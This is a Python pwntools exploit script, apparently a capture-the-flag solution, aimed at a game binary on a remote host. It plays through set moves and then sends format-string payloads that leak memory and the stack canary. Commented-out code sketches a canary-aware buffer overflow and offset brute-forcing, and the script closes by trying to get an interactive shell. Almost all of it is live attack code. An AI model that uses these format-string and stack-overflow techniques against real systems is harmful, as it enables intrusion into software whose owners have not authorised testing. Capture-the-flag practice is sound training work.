from pwn import *

CONN = "nc 34.124.192.13 57260"
HOST = CONN.split(" ")[1]
PORT = CONN.split(" ")[2]

# Allows you to switch between local/GDB/remote from terminal


def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(HOST, PORT, *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Lib-C library, can use pwninit/patchelf to patch binary
# libc = ELF("./libc.so.6")
# ld = ELF("./ld-2.27.so")


# Start program
io = start()

# Send the payload


def send_row_col(rc):
    io.sendlineafter(b"(1-3):", rc)


def solve():
    io.sendlineafter(b"[3] Exit", b"1")
    send_row_col(b"1")
    send_row_col(b"1")
    send_row_col(b"2")
    send_row_col(b"1")
    send_row_col(b"1")
    send_row_col(b"2")
    send_row_col(b"2")
    send_row_col(b"2")
    send_row_col(b"1")
    send_row_col(b"3")


solve()


def brute_s(i):
    io.sendlineafter(b"'X'?", f"%{i}$s ".encode())
    io.sendlineafter(b"'O'?", f"%{i}$s ".encode())


def create_fmt(fmt, what):
    leak = f"|%19${fmt}|".encode("utf-8")
    leak = leak.ljust(66, b"A")
    leak += p64(what)
    return leak


a = create_fmt("s", 0x400000)

# io.sendlineafter(b"'X'?", p64(0x4000000))
# io.sendlineafter(b"'O'?", a)
io.sendlineafter(b"'X'?", b"~%127$p~")
io.sendlineafter(b"'O'?", a + b"%p%p%p%p%p%p%p")
# print(io.recvline())
# io.recvuntil(b"~")
# CANARY = io.recvline().decode().split("~")[0]
# CANARY = int(CANARY, 16)

# info("CANARY: " + hex(CANARY))


# SUGGESTION = b"A" * (200) + p64(CANARY) + p64(CANARY)
# io.sendlineafter(b"Enter your suggestion: ", SUGGESTION)

# for i in range(100):
#     io = start()
#     solve()
#     brute_s(i)

#     print(io.recvall())

# CANARY DI 127
# io.sendlineafter(b"'O'?", b"%p ")

# Got Shell?
io.interactive()
